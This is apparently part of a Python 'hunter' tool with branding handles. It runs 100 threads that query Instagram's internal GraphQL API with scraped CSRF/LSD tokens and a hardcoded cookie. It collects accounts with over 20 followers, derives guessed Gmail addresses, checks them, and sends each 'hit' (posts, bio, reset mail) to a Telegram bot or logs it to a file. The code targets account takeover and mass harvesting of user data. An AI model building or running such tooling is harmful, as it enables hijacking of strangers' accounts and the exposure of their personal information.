◈ 𝐏𝐎𝐒𝐓𝐒      ◈ {posts}
◈ 𝐁𝐈𝐎        ◈ {biography[:60] if biography != 'N/A' else '______'}
◈ 𝐑𝐄𝐒𝐄𝐓 𝐌𝐀𝐈𝐋 ◈ {mail}
◈ 𝐔𝐑𝐋        ◈ instagram.com/{username}

✦ @senselessme - @novalportal
"""
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={content}", timeout=20)
    except:
        with open('NOVAL_HITS.txt', 'a') as a:
            a.write(f'{content}\n')

def get_tokens():
    while True:
        try:
            headers = {
                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                'x-ig-app-id': "936619743392459",
                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
                'origin': "https://www.instagram.com", 'referer': "https://www.instagram.com/",
            }
            response = session.get('https://www.instagram.com/', headers=headers, timeout=20)
            csrf = response.cookies.get('csrftoken', '')
            find = re.search(r'"LSD",\[\],\{"token":"(.*?)"\}', response.text)
            lsd = find.group(1) if find else None
            with open("tokens.txt", "w") as fd:
                fd.write(f"{csrf}|{lsd}")
        except:
            pass
        time.sleep(2)

Thread(target=get_tokens, daemon=True).start()

def load_tokens():
    try:
        with open('tokens.txt', 'r') as file:
            parts = file.read().strip().split("|")
            if len(parts) == 2:
                csrf, lsd = parts
                if csrf and lsd:
                    return csrf, lsd
    except:
        pass
    return "bKPOnxXALzrHjjhgVUSXUWvsJSheI52L", "9CaKjXH_JGbfD4zZaTfZ8a"

def get_usernames():
    global email
    while True:
        csrf, lsd = load_tokens()
        cookies = {'rur': '"HIL\\0545636887483\\0541808136332:01fe43b89fcef61b8a466bfa81acf2b1bbab08f406fc99b1da8b7d889fa68683a3364c43"'}
        headers = {
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
            'x-ig-app-id': '936619743392459', 'x-fb-lsd': lsd,
            'sec-ch-prefers-color-scheme': 'light', 'x-csrftoken': csrf,
            'sec-ch-ua-platform': '"Android"', 'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin'
        }
        payload = {
            'lsd': lsd,
            'variables': json.dumps({"userID": random.randint(2500000000, 21254029834), "username": "cristiano"}),
            'doc_id': '7717269488336001',
        }
        response = session.post('https://www.instagram.com/api/graphql', headers=headers, data=payload, cookies=cookies, timeout=20)
        try:
            username = response.json().get('data', {}).get('user', {}).get('username', {})
            followers = response.json().get('data', {}).get('user', {}).get('follower_count', {})
            user_id = response.json().get('data', {}).get('user', {}).get('pk', {})
            if username and user_id and followers and followers > 20:
                info[username] = response.json().get('data', {}).get('user', {})
                email = username + '@gmail.com'
                lookup(email)
        except:
            pass

print(f"\n{GREEN}🚀 INITIALIZING 200 WORKERS...{RESET}\n")
display()
time.sleep(1)

with ThreadPoolExecutor(max_workers=100) as executor:
    for _ in range(200):
        executor.submit(get_usernames)
